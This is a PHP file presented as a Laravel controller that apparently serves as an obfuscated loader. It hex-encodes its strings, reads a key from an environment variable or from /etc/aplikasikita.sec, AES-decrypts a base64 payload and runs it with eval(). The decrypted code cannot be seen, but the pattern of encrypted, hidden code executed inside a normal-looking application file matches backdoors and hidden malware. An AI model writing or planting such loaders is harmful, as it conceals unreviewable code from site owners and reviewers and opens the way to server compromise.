<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('4J+3bxSWsVcHQqu03wk1Eg==');

$c=base64_decode(

'YVMtzqB1OepWC97lFUf93GpfxVXF6RWEQ/4enrzCyRc13dUEPgOQ9MXKC5Of7waP0rP1GSogr0Df' .
'z+sviw/2sd5JNdtBxz/lv3Qopjno+KyXNLL/ZfSa12h4iRUV2mHSHY9kzdg0tfV7qawe5qkNNrHj' .
'rFzfcCW2rE7JfpKoV/Nl5zq+L2AoctSWEweZMSD3q/OGxhzjBbvTxr5CPPkk63VftcD2ZBBd0zZa' .
'hhp7fKWU0JuL/Vb7srugP8/btrjP'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

